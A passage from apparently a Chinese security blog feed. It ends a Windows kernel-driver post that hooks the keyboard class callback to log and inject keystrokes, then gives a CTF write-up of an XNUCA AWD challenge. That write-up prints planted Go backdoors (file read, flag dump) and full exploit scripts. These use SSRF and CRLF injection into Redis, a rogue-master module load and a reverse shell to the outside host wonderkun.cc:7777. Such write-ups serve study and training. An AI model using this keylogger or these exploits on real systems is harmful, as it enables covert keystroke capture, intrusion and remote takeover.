&#123;</span><br><span class="line">			PVOID tmp;</span><br><span class="line">			<span class="keyword">if</span> (!MmIsAddressValid(DeviceExt))</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="comment">//找到后会填写到这个全局变量中，这里检查是否已经填好了  </span></span><br><span class="line">			<span class="comment">//如果已经填好了就不用继续找了，可以直接退出  </span></span><br><span class="line">			<span class="keyword">if</span> (gkdbCallback.classDeviceObject &amp;&amp; gkdbCallback.serviceCallback)</span><br><span class="line">			&#123;</span><br><span class="line">				status = STATUS_SUCCESS;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="comment">//在端口驱动的设备扩展里，找到了类驱动设备对象，填好类驱动设备对象后继续  </span></span><br><span class="line">			tmp = *(PVOID*)DeviceExt;</span><br><span class="line">			<span class="keyword">if</span> (tmp == pTargetDeviceObject)</span><br><span class="line">			&#123;</span><br><span class="line">				gkdbCallback.classDeviceObject = pTargetDeviceObject;</span><br><span class="line">				<span class="keyword">continue</span>;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			<span class="comment">//如果在设备扩展中找到一个地址位于KbdClass这个驱动中，就可以认为，这就是我们要找的回调函数  </span></span><br><span class="line">			<span class="keyword">if</span> ((tmp &gt; KbdDriverStart) &amp;&amp; (tmp &lt; (UCHAR*)KbdDriverStart + KbdDriverSize) &amp;&amp;</span><br><span class="line">				(MmIsAddressValid(tmp)))</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="comment">//将这个回调函数记录下来  </span></span><br><span class="line">				DbgPrint(<span class="string">"KEYBOARDCLASSSERVICECALLBACK address: %p"</span>, tmp);</span><br><span class="line">				gkdbCallback.serviceCallback = (KEYBOARDCLASSSERVICECALLBACK)tmp;</span><br><span class="line">				gkdbCallback.AddrServiceCallback = (PVOID *)DeviceExt;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (status == STATUS_SUCCESS)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">//换成下一个设备，继续遍历  </span></span><br><span class="line">		pTargetDeviceObject = pTargetDeviceObject-&gt;NextDevice;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> status;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>看网上很多代码都是在找到<code>KeyboardClassServiceCallback</code>回到函数的地址之后采用inline hook的方式进行键盘记录，其实没必要那么复杂，直接替换掉驱动扩展里面的函数指针为我们自己的函数，就可以实现键盘记录了：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (gkdbCallback.serviceCallback &amp;&amp; gkdbCallback.AddrServiceCallback) &#123;</span><br><span class="line">   <span class="comment">// 如果找到了回调函数，就修改掉回调函数</span></span><br><span class="line">	DbgPrint(<span class="string">"Replace the keyboardClassCallback to mycallback!\n"</span>);</span><br><span class="line">    *gkdbCallback.AddrServiceCallback = mycallback;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们自己的回调函数如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">VOID __stdcall <span class="title">mycallback</span><span class="params">( <span class="comment">// 定义回调函数</span></span></span></span><br><span class="line"><span class="function"><span class="params">	_In_    PDEVICE_OBJECT       DeviceObject,</span></span></span><br><span class="line"><span class="function"><span class="params">	_In_    PKEYBOARD_INPUT_DATA InputDataStart,</span></span></span><br><span class="line"><span class="function"><span class="params">	_In_    PKEYBOARD_INPUT_DATA InputDataEnd,</span></span></span><br><span class="line"><span class="function"><span class="params">	_Inout_ PULONG               InputDataConsumed</span></span></span><br><span class="line"><span class="function"><span class="params">)</span> </span>&#123;</span><br><span class="line">	DbgPrint(<span class="string">"mycall back run."</span>);</span><br><span class="line">	DbgPrint(<span class="string">"Send %d input data packets data this time."</span>,*InputDataConsumed);</span><br><span class="line"></span><br><span class="line">	DbgPrint(<span class="string">"The first PKEYBOARD_INPUT_DATA address is %p."</span>, InputDataStart);</span><br><span class="line"></span><br><span class="line">	DbgPrint(<span class="string">"The last PKEYBOARD_INPUT_DATA address is %p."</span>, InputDataEnd);</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; (InputDataEnd- InputDataStart); i++) &#123;</span><br><span class="line">	    </span><br><span class="line">		DbgPrint(<span class="string">"The Scancode : %d,key %s\n"</span>, (InputDataStart + i * <span class="keyword">sizeof</span>(KEYBOARD_INPUT_DATA))-&gt;MakeCode, (InputDataStart + i * <span class="keyword">sizeof</span>(KEYBOARD_INPUT_DATA))-&gt;Flags ? <span class="string">"Up"</span>:<span class="string">"Down"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> gkdbCallback.serviceCallback(DeviceObject, InputDataStart, InputDataEnd, InputDataConsumed);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="内核态按键模拟"><a href="#内核态按键模拟" class="headerlink" title="内核态按键模拟"></a>内核态按键模拟</h4><p>我们只需要手工调用<code>KeyboardClassServiceCallback</code>这个函数，就可以进行按键模拟了，为了简单，我直接在自己写的回调函数中加了一个例子：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">VOID __stdcall <span class="title">mycallback</span><span class="params">( <span class="comment">// 定义回调函数</span></span></span></span><br><span class="line"><span class="function"><span class="params">	_In_    PDEVICE_OBJECT       DeviceObject,</span></span></span><br><span class="line"><span class="function"><span class="params">	_In_    PKEYBOARD_INPUT_DATA InputDataStart,</span></span></span><br><span class="line"><span class="function"><span class="params">	_In_    PKEYBOARD_INPUT_DATA InputDataEnd,</span></span></span><br><span class="line"><span class="function"><span class="params">	_Inout_ PULONG               InputDataConsumed</span></span></span><br><span class="line"><span class="function"><span class="params">)</span> </span>&#123;</span><br><span class="line">	DbgPrint(<span class="string">"mycall back run."</span>);</span><br><span class="line">	DbgPrint(<span class="string">"Send %d input data packets data this time."</span>,*InputDataConsumed);</span><br><span class="line"></span><br><span class="line">	DbgPrint(<span class="string">"The first PKEYBOARD_INPUT_DATA address is %p."</span>, InputDataStart);</span><br><span class="line"></span><br><span class="line">	DbgPrint(<span class="string">"The last PKEYBOARD_INPUT_DATA address is %p."</span>, InputDataEnd);</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; (InputDataEnd- InputDataStart); i++) &#123;</span><br><span class="line">	    </span><br><span class="line">		DbgPrint(<span class="string">"The Scancode : %d,key %s\n"</span>, (InputDataStart + i * <span class="keyword">sizeof</span>(KEYBOARD_INPUT_DATA))-&gt;MakeCode, (InputDataStart + i * <span class="keyword">sizeof</span>(KEYBOARD_INPUT_DATA))-&gt;Flags ? <span class="string">"Up"</span>:<span class="string">"Down"</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 主动调用回调函数，发送一个 1 的按键消息 </span></span><br><span class="line">	KEYBOARD_INPUT_DATA fakeKey = *InputDataStart; </span><br><span class="line">	fakeKey.MakeCode = <span class="number">2</span>; <span class="comment">// 按键 1 的scancode 是 2</span></span><br><span class="line">	PKEYBOARD_INPUT_DATA fakeInputDataStart = &amp;fakeKey;</span><br><span class="line">	PKEYBOARD_INPUT_DATA fakeInputDataEnd = fakeInputDataStart + <span class="number">1</span> ;</span><br><span class="line">	ULONG fakeInputDataConsumed = <span class="number">0</span>; </span><br><span class="line">	gkdbCallback.serviceCallback(DeviceObject,fakeInputDataStart,fakeInputDataEnd,&amp;fakeInputDataConsumed);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> gkdbCallback.serviceCallback(DeviceObject, InputDataStart, InputDataEnd, InputDataConsumed);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这样产生的效果是，无论我们按什么键，都会在前面加个1，比如我们输入<code>abc</code>，系统得到其实是<code>1a1b1c</code>。</p>
]]></content>
      <categories>
        <category>windows驱动</category>
      </categories>
      <tags>
        <tag>windows</tag>
        <tag>c</tag>
        <tag>内核驱动</tag>
      </tags>
  </entry>
  <entry>
    <title>XNUCA决赛awd1题解</title>
    <url>/2020/01/12/XNUCA%E5%86%B3%E8%B5%9Bawd1%E9%A2%98%E8%A7%A3/</url>
    <content><![CDATA[<h2 id="0x1-前言"><a href="#0x1-前言" class="headerlink" title="0x1 前言"></a>0x1 前言</h2><p>我的拖延症真是没得救了,拖了这么久才写题解 ……</p>
<p>题目环境以及源码上传在<a href="https://github.com/NeSE-Team/OurChallenges/tree/master/XNUCA2019Final/awd1_with_exp" target="_blank" rel="noopener">https://github.com/NeSE-Team/OurChallenges/tree/master/XNUCA2019Final/awd1_with_exp</a></p>
<p>当被告知要出一个 reverse + web 的题目的时候，我的内心十分的拒绝，因为对逆向我实在是太差了，没有相关的经验，而事实证明我题目出的也是很烂，导致比赛一开始就被打开花了。</p>
<a id="more"></a>

<p>虽然出的比较烂，但是还是有朋友希望我能把题目源码和环境发出来，毕竟国内的线下awd比赛中web和二进制相结合的也不是太多。</p>
<p>这篇文章就讲一下漏洞以及利用过程。</p>
<h2 id="0x2-题目漏洞简介"><a href="#0x2-题目漏洞简介" class="headerlink" title="0x2 题目漏洞简介"></a>0x2 题目漏洞简介</h2><p>因为是awd题目，所以不得不加了两个后门，就不再详细说了。只贴一下源码吧。</p>
<p>第一个后门：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">info</span><span class="params">( c *Context)</span> <span class="title">error</span></span> &#123;</span><br><span class="line">	userAgent := c.Request().Header.Get(<span class="string">"User-Agent"</span>)</span><br><span class="line"></span><br><span class="line">	info := <span class="string">"hello world"</span></span><br><span class="line">	<span class="keyword">if</span> strings.EqualFold(userAgent,<span class="string">"Mozilla/5.0 (Macintosh; wdeYKQtOhc6L8TsIm1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.70 Safari/537.36"</span>)&#123;</span><br><span class="line">		fileName := c.QueryParam(<span class="string">"file"</span>)</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> contents,err := ioutil.ReadFile(fileName) ; err == <span class="literal">nil</span> &#123;</span><br><span class="line">			<span class="keyword">return</span> c.String(http.StatusOK,fmt.Sprintf(<span class="string">"%s,🤣🤣:%s"</span>,info,contents))</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> c.String(http.StatusOK,fmt.Sprintf(<span class="string">"%s,🤣🤣"</span>,info))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>第二个后门:</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">admin</span><span class="params">( c *Context )</span> <span class="title">error</span></span> &#123;</span><br><span class="line">	fmt.Println(c.Request().RemoteAddr)</span><br><span class="line">	ipstr ,_,_ := net.SplitHostPort(c.Request().RemoteAddr)</span><br><span class="line"></span><br><span class="line">	ip := net.ParseIP(ipstr)</span><br><span class="line"></span><br><span class="line">	fmt.Println(ip)</span><br><span class="line">	localip := net.ParseIP(<span class="string">"127.0.0.1"</span>)</span><br><span class="line">	<span class="keyword">if</span> !ip.Equal(localip) &#123;</span><br><span class="line">		<span class="keyword">return</span> echo.NewHTTPError(http.StatusForbidden)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	info := Adminnote&#123; getVersion(),getWho(),<span class="string">"cat /proc/meminfo"</span>&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> contents,err := ioutil.ReadFile(<span class="string">"/flag"</span>) ; err == <span class="literal">nil</span> &#123;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// return c.String(http.StatusOK,fmt.Sprintf("%s,🤣🤣:%s",info,contents))</span></span><br><span class="line">		userAgent := c.Request().Header.Get(<span class="string">"Identify-Client"</span>)</span><br><span class="line">		<span class="keyword">if</span> userAgent == <span class="string">""</span> &#123;</span><br><span class="line">			userAgent = randString(<span class="number">32</span>)</span><br><span class="line">		&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">			userAgent = md5String(userAgent)</span><br><span class="line">		&#125;</span><br><span class="line">		ioutil.WriteFile(<span class="string">"./assets/"</span>+userAgent,[]<span class="keyword">byte</span>(contents),<span class="number">0400</span>)</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> c.String(http.StatusOK,fmt.Sprintf(<span class="string">"%s,🤣🤣"</span>,info))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>下面详细说一下本题目中真正存在的漏洞。</p>
<h3 id="SSRF漏洞和CRLF漏洞"><a href="#SSRF漏洞和CRLF漏洞" class="headerlink" title="SSRF漏洞和CRLF漏洞"></a>SSRF漏洞和CRLF漏洞</h3><p>SSRF漏洞不用说了，没有任何过滤，可以直接打。</p>
<p>CRLF漏洞是go语言的库 net/http 的问题，参考如下 issue <a href="https://github.com/golang/go/issues/30794" target="_blank" rel="noopener">https://github.com/golang/go/issues/30794</a>。</p>
<ol>
<li><p>利用CRLF漏洞一方面可以绕过 <code>e.POST(&quot;/admin&quot;,handler(admin))</code> 中对ip的检查，调用这个后门获取flag。</p>
</li>
<li><p>另一方面可以利用CRLF漏洞和SSRF漏洞可以用来打redis。</p>
</li>
</ol>
<h3 id="go语言的反序列化-类型反射"><a href="#go语言的反序列化-类型反射" class="headerlink" title="go语言的反序列化+类型反射"></a>go语言的反序列化+类型反射</h3><p>不得不承认go语言是非常安全的，为了写出点漏洞，我也是拼了…. 我太难了。</p>
<p>go语言的反序列化过程是可以保证安全的，但是这却给写代码很多不便，因为很多时候我们的确需要一些动态的特性，比如根据不同的序列化数据在反序列化的时候产生不同的对象来方便使用，这个时候只能使用反射来帮忙。</p>
<p>代码中根据 note 的不同，初始化出不同的对象。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">index</span><span class="params">(c *Context)</span> <span class="title">error</span></span> &#123;</span><br><span class="line">	s := c.Session()</span><br><span class="line">	notes := s.Get(<span class="string">"notes"</span>)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(notes == <span class="literal">nil</span> )&#123;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span>  c.String(http.StatusOK,<span class="string">"Here is no note for you ."</span>)</span><br><span class="line">	&#125;</span><br><span class="line">	tmp := notes.([]<span class="keyword">interface</span>&#123;&#125;)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">var</span> buf bytes.Buffer</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> k,v := <span class="keyword">range</span> tmp &#123;</span><br><span class="line"></span><br><span class="line">		fmt.Println(k,v)</span><br><span class="line">		note := v.(<span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">interface</span>&#123;&#125;)</span><br><span class="line">		fmt.Println(note[<span class="string">"Type"</span>])</span><br><span class="line">		noteReal , _ := newStruct( note[<span class="string">"Type"</span>].(<span class="keyword">string</span>) )</span><br><span class="line">		</span><br><span class="line">		<span class="comment">// noteNew.Title = "ddddddddd"</span></span><br><span class="line">		<span class="comment">// fmt.Println( reflect.TypeOf(noteReal) )</span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">switch</span>  t :=noteReal.(<span class="keyword">type</span>) &#123;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">case</span> Textnote:</span><br><span class="line">				<span class="comment">// newNote := noteReal.(Text)</span></span><br><span class="line">				value := reflect.ValueOf(&amp;t).Elem()</span><br><span class="line">				typeOfT := value.Type()</span><br><span class="line"></span><br><span class="line">				<span class="keyword">for</span> k,v := <span class="keyword">range</span> note[<span class="string">"Data"</span>].(<span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">interface</span>&#123;&#125;)&#123;</span><br><span class="line">                    ... </span><br><span class="line">                    </span><br><span class="line">				&#125;</span><br><span class="line">				buf.WriteString(fmt.Sprintf(<span class="string">"%s&lt;/br&gt;"</span>,t))</span><br><span class="line">			</span><br><span class="line">			<span class="keyword">case</span> Urlnote:</span><br><span class="line">				<span class="comment">// newNote := noteReal.(Text)</span></span><br><span class="line">				value := reflect.ValueOf(&amp;t).Elem()</span><br><span class="line">				typeOfT := value.Type()</span><br><span class="line"></span><br><span class="line">				<span class="keyword">for</span> k,v := <span class="keyword">range</span> note[<span class="string">"Data"</span>].(<span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">interface</span>&#123;&#125;)&#123;</span><br><span class="line"></span><br><span class="line">					<span class="comment">// fmt.Println(k,"textnote")</span></span><br><span class="line"></span><br><span class="line">                    <span class="comment">// value.FieldByName( strings.Title(k) ).Set(reflect.ValueOf(v.(string)))</span></span><br><span class="line">                    ...</span><br><span class="line">				&#125;</span><br><span class="line">				buf.WriteString(fmt.Sprintf(<span class="string">"%s&lt;/br&gt;"</span>,t))</span><br><span class="line">			</span><br><span class="line">			<span class="keyword">case</span> Adminnote:</span><br><span class="line">				<span class="comment">// newNote := noteReal.(Text)</span></span><br><span class="line">				fmt.Println(<span class="string">"this is adminnote"</span>)</span><br><span class="line">				value := reflect.ValueOf(&amp;t).Elem()</span><br><span class="line">				typeOfT := value.Type()</span><br><span class="line"></span><br><span class="line">				<span class="keyword">for</span> k,v := <span class="keyword">range</span> note[<span class="string">"Data"</span>].(<span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">interface</span>&#123;&#125;)&#123;</span><br><span class="line"></span><br><span class="line">					<span class="comment">// fmt.Println(k,"textnote")</span></span><br><span class="line"></span><br><span class="line">					<span class="comment">// value.FieldByName( strings.Title(k) ).Set(reflect.ValueOf(v.(string)))</span></span><br><span class="line"></span><br><span class="line">					count := value.NumField()</span><br><span class="line">					<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; count; i++ &#123;</span><br><span class="line">						f := value.Field(i)</span><br><span class="line">						name := typeOfT.Field(i).Name</span><br><span class="line">						<span class="keyword">if</span> strings.ToLower(name) == k &#123;</span><br><span class="line"></span><br><span class="line">							<span class="keyword">switch</span> f.Kind() &#123;</span><br><span class="line">								<span class="keyword">case</span> reflect.String:</span><br><span class="line">									<span class="comment">// fmt.Println( strings.Title(k), "string")</span></span><br><span class="line">									value.FieldByName( strings.Title(k) ).Set(reflect.ValueOf(v.(<span class="keyword">string</span>)))</span><br><span class="line">								<span class="keyword">case</span> reflect.Int:</span><br><span class="line">									<span class="comment">// fmt.Println( strings.Title(k), "int" )</span></span><br><span class="line">									value.FieldByName( strings.Title(k) ).Set(reflect.ValueOf( <span class="keyword">int</span>(v.(<span class="keyword">float64</span>)) ))</span><br><span class="line">							&#125;</span><br><span class="line">						&#125;</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">				buf.WriteString(fmt.Sprintf(<span class="string">"%s&lt;/br&gt;"</span>,t))</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> c.String(http.StatusOK,buf.String())</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>利用这个反射可以直接初始化出来 <code>Adminnote</code>, 然后看到最后的 <code>buf.WriteString(fmt.Sprintf(&quot;%s&lt;/br&gt;&quot;,t))</code>,可以直接调用 <code>Adminnote</code> 的 <code>String</code>函数，这点倒是和大多数的高级语言比较相似。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c Adminnote)</span><span class="title">String</span><span class="params">()</span> <span class="title">string</span></span>&#123;</span><br><span class="line">	<span class="keyword">var</span> buf bytes.Buffer</span><br><span class="line">	</span><br><span class="line">	buf.WriteString(<span class="string">"System Version: \n"</span>)</span><br><span class="line">	buf.WriteString(c.Version + <span class="string">"\n"</span>)</span><br><span class="line"></span><br><span class="line">	buf.WriteString(<span class="string">"Login user : \n"</span>)</span><br><span class="line">	buf.WriteString(c.Who + <span class="string">"\n"</span>)</span><br><span class="line"></span><br><span class="line">	</span><br><span class="line">	getMemory :=  strings.Split(c.Memory,<span class="string">" "</span>)</span><br><span class="line"></span><br><span class="line">	buf.WriteString(<span class="string">"Memory Status: \n"</span>)</span><br><span class="line">	cmd := exec.Command(getMemory[<span class="number">0</span>],getMemory[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">	stdout, err := cmd.StdoutPipe()</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="comment">// memoryStats := </span></span><br><span class="line">		buf.WriteString(err.Error())</span><br><span class="line">		<span class="keyword">return</span> buf.String()</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">defer</span> stdout.Close()</span><br><span class="line">    <span class="comment">// 运行命令</span></span><br><span class="line">    <span class="keyword">if</span> err := cmd.Start(); err != <span class="literal">nil</span> &#123;</span><br><span class="line">		buf.WriteString(err.Error())</span><br><span class="line">		<span class="keyword">return</span> buf.String()</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	opBytes, err := ioutil.ReadAll(stdout)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		buf.WriteString(err.Error())</span><br><span class="line">		<span class="keyword">return</span> buf.String()</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// buf.</span></span><br><span class="line">    </span><br><span class="line">	buf.WriteString(<span class="keyword">string</span>(opBytes))</span><br><span class="line">	<span class="keyword">return</span> buf.String()</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果可以完全控制 <code>Adminnote</code> 的内容，就可以利用 <code>getMemory</code> 这个点实现任意命令执行。</p>
<h2 id="0x3-非预期解"><a href="#0x3-非预期解" class="headerlink" title="0x3 非预期解"></a>0x3 非预期解</h2><p>我没有仔细看 sid 和 redis中的key值的对应关系，导致了可以根据 sid 直接获取到redis中的key值，进而使用ssrf直接控制redis中对应的key值为对应的内容，实现rce。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">name = <span class="string">'session_'</span>+s0.cookies[<span class="string">'sid'</span>].replace(<span class="string">'-'</span>,<span class="string">'+'</span>).replace(<span class="string">'_'</span>,<span class="string">'/'</span>).decode(<span class="string">'base64'</span>).split(<span class="string">'|'</span>)[<span class="number">1</span>].decode(<span class="string">'base64'</span>)[<span class="number">4</span>:]</span><br><span class="line">val = <span class="string">"&#123;\"notes\":[&#123;\"Type\":\"adminnote\",\"Data\":&#123;\"title\":\"aaa\",\"memory\":\"cat /flag\",\"who\":\"dotsu\",\"version\":\"1234\"&#125;&#125;]&#125;"</span></span><br><span class="line">data = &#123;</span><br><span class="line"><span class="string">'title'</span>:<span class="string">'test1'</span>,</span><br><span class="line"><span class="string">'url'</span>:<span class="string">'http://redis:6379?\r\nauth redis123456aB\r\nSET %s \'%s\'\r\n'</span>%(name, val)</span><br><span class="line">&#125;</span><br><span class="line">r = s1.post(timeout=<span class="number">4</span>,url=note_now_url,data=data)</span><br></pre></td></tr></table></figure>

<p>哎，这样太简单了，直接导致某些队伍直接爆打全场，贼大的失误。。。</p>
<h2 id="0x4-预期解法"><a href="#0x4-预期解法" class="headerlink" title="0x4 预期解法"></a>0x4 预期解法</h2><p>我预期的解法是不知道redis中的key的情况下修改redis中的数据，控制go服务实现任意命令执行，下面详细说一下预期解法的实现步骤</p>
<p><strong>预期解法：</strong></p>
<ol>
<li>使用redis的slave模式，让其加载恶意的so模块，实现 redis 的 rce，反弹 shell 。</li>
<li>然后利用 redis 反弹的 shell，读取 redis 中的 key 值</li>
<li>修改key值对应的 value，实现 go web 服务的 rce。</li>
</ol>
<p>但是获取 redis 的 shell 过程有两个问题需要解决：</p>
<ol>
<li><p>redis成为 slave 模式之后，就会清空自己的数据，并变成不可写。因为redis变成不可写，导致无法插入新的urlnote，无法发起新的SSRF攻击。</p>
</li>
<li><p>redis 成为 slave 模式之后，隔一段时间才会去下载 master 的数据。 因为有一段时间间隔，导致我们没办法使用一个 SSRF payload 让 redis 成为 slave 模式的同时，还可以加载 so 库 ，并实现任意代码执行。</p>
</li>
</ol>
<p><strong>如果你找到了仅使用一个 SSRF payload 就拿到 redis 的 shell 的办法，请一定要带带我</strong></p>
<p>为了解决这个问题，就需要发送两个请求，第一个请求让 redis 成为 slave 模式，第二个请求让redis加载第三方模块，进行命令执行，同时恢复正常模式。</p>
<p>但是这两个请求之间要有一个较长的时间延迟，让redis有足够的时间去同步master的数据。所以这里最好的做法是在两个请求之间再插入一个请求，让这个请求连接一个不存在的地址，等待TCP超时之后，再发起第三个请求。</p>
<p>最后的exp如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp3</span><span class="params">(host)</span>:</span></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">       /urlnote  </span></span><br><span class="line"><span class="string">       ssrf connect redis to getshell </span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line"></span><br><span class="line">    url = <span class="string">"http://&#123;&#125;/urlnote"</span>.format(host)</span><br><span class="line"></span><br><span class="line">    session = requests.Session()</span><br><span class="line"></span><br><span class="line">    header = &#123;</span><br><span class="line">        <span class="string">"Content-Type"</span>: <span class="string">"application/x-www-form-urlencoded"</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># send payload 1 ， set redis to slave </span></span><br><span class="line">    payload = <span class="string">"title=payload1&amp;url=http://172.16.0.3:6379/?a=1%0d%0a*2%0d%0a$4%0d%0aauth%0d%0a$13%0d%0aredis123456aB%0d%0a*4%0d%0a$6%0d%0aCONFIG%0d%0a$3%0d%0aSET%0d%0a$10%0d%0adbfilename%0d%0a$6%0d%0aexp.so%0d%0a*3%0d%0a$7%0d%0aSLAVEOF%0d%0a$12%0d%0awonderkun.cc%0d%0a$5%0d%0a21000%0d%0a"</span></span><br><span class="line"></span><br><span class="line">    res = session.post(url,data=payload,headers=header)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> res.status_code != <span class="number">200</span> :</span><br><span class="line">        print(<span class="string">"[*] ssrf connect redis error!"</span>)</span><br><span class="line">        <span class="keyword">return</span> </span><br><span class="line"></span><br><span class="line">    <span class="comment"># send payload 2 , set timeout </span></span><br><span class="line">    payload = <span class="string">"title=payload2&amp;url=http://192.168.0.100:7777/?a=test"</span> <span class="comment"># add a host ，without route to it</span></span><br><span class="line"></span><br><span class="line">    res = session.post(url,data=payload,headers=header)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> res.status_code != <span class="number">200</span> :</span><br><span class="line">        print(<span class="string">"[*] ssrf connect redis error!"</span>)</span><br><span class="line">        <span class="keyword">return</span> </span><br><span class="line"></span><br><span class="line">    <span class="comment"># send paylaod 3, let redis reverse shell to wonderkun.cc:7777 </span></span><br><span class="line"></span><br><span class="line">    payload = <span class="string">"title=payload3&amp;url=http://172.16.0.3:6379/?a=1%0d%0a*2%0d%0a$4%0d%0aauth%0d%0a$13%0d%0aredis123456aB%0d%0a*3%0d%0a$6%0d%0aMODULE%0d%0a$4%0d%0aLOAD%0d%0a$8%0d%0a./exp.so%0d%0a*3%0d%0a$6%0d%0aMODULE%0d%0a$4%0d%0aLOAD%0d%0a$8%0d%0a./exp.so%0d%0a*3%0d%0a$6%0d%0aMODULE%0d%0a$4%0d%0aLOAD%0d%0a$8%0d%0a./exp.so%0d%0a*3%0d%0a$6%0d%0aMODULE%0d%0a$4%0d%0aLOAD%0d%0a$8%0d%0a./exp.so%0d%0a*3%0d%0a$6%0d%0aMODULE%0d%0a$4%0d%0aLOAD%0d%0a$8%0d%0a./exp.so%0d%0a*3%0d%0a$6%0d%0aMODULE%0d%0a$4%0d%0aLOAD%0d%0a$8%0d%0a./exp.so%0d%0a*3%0d%0a$6%0d%0aMODULE%0d%0a$4%0d%0aLOAD%0d%0a$8%0d%0a./exp.so%0d%0a*3%0d%0a$6%0d%0aMODULE%0d%0a$4%0d%0aLOAD%0d%0a$8%0d%0a./exp.so%0d%0a*3%0d%0a$6%0d%0aMODULE%0d%0a$4%0d%0aLOAD%0d%0a$8%0d%0a./exp.so%0d%0a*3%0d%0a$7%0d%0aSLAVEOF%0d%0a$2%0d%0aNO%0d%0a$3%0d%0aONE%0d%0a*2%0d%0a$11%0d%0asystem.exec%0d%0a$2%0d%0als%0d%0a"</span></span><br><span class="line"></span><br><span class="line">    res = session.post(url,data=payload,headers=header)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> res.status_code != <span class="number">200</span> :</span><br><span class="line">        print(<span class="string">"[*] ssrf connect redis error!"</span>)</span><br><span class="line">        <span class="keyword">return</span> </span><br><span class="line">    </span><br><span class="line">    url = <span class="string">"http://&#123;&#125;/"</span>.format(host)</span><br><span class="line"></span><br><span class="line">    res = session.get(url)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># nc -l -p 7777 , return shell to wonderkun.cc:7777 </span></span><br><span class="line">    <span class="comment"># set adminnote to RCE go server. </span></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    run </span></span><br><span class="line"><span class="string">    &gt; redis-cli </span></span><br><span class="line"><span class="string">       &gt; auth key</span></span><br><span class="line"><span class="string">       &gt; set key '&#123;"notes":[&#123;"Type":"adminnote","Data":&#123;"version":"172.18.2:6379","who":"wonderkun","memory":"cat 